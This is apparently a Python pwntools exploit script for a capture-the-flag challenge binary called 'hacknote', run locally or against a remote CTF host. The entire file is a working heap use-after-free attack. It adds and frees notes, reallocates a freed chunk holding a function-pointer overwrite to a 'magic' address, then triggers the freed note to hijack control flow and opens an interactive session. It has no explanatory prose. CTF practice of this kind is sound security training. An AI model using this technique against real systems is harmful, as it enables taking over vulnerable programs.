import pwn
import pwnlib
import time

CODE_ADD_NOTE = '1'
CODE_DEL_NOTE = '2'
CODE_PRINT_NOTE = '3'

magic_address = 0x400c23

pwn.context.terminal = ['tmux', 'splitw', '-h']

PIPE_CLEAN_TIME = 0.1

def add_note(process, size, payload):
    p = process
    print 'add_note', size, len(payload)
    print p.clean(PIPE_CLEAN_TIME)
    p.sendline(CODE_ADD_NOTE)
    print p.clean(PIPE_CLEAN_TIME)
    p.sendline(str(size)) # size
    print p.clean(PIPE_CLEAN_TIME)
    p.send(payload) # content
    print p.clean(PIPE_CLEAN_TIME)

def del_note(process, index):
    p = process
    print 'del_node', index
    print p.clean(PIPE_CLEAN_TIME)
    p.sendline(CODE_DEL_NOTE)
    print p.clean(PIPE_CLEAN_TIME)
    p.sendline(str(index))
    print p.clean(PIPE_CLEAN_TIME)

def print_note(process, index):
    p = process
    pwn.gdb.attach(p, '''
    b *0x400b61
    c
    ''')
    print 'print_note', index
    print p.clean(PIPE_CLEAN_TIME)
    p.sendline(CODE_PRINT_NOTE)
    print p.clean(PIPE_CLEAN_TIME)
    p.sendline(str(index))
    print p.clean(PIPE_CLEAN_TIME)

if __name__ == '__main__':
    if pwnlib.args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10137)
    else:
        p = pwn.process('./hacknote-77d489a4ae9b76323ce9a09a95d29c01607965d8')

    # create 2 note, free 2
    add_note(p, 16, 'x'*15) # 0
    add_note(p, 99999, 'y'*15) # 1
    add_note(p, 16, 'z'*15) # 2
    del_note(p, 0)
    del_note(p, 1)

    # take 2 fast chunks
    add_note(p, 16, pwn.p64(magic_address)*2) # 3

    # goto the magical place
    print_note(p, 0)
    print p.clean(1)
    p.interactive()
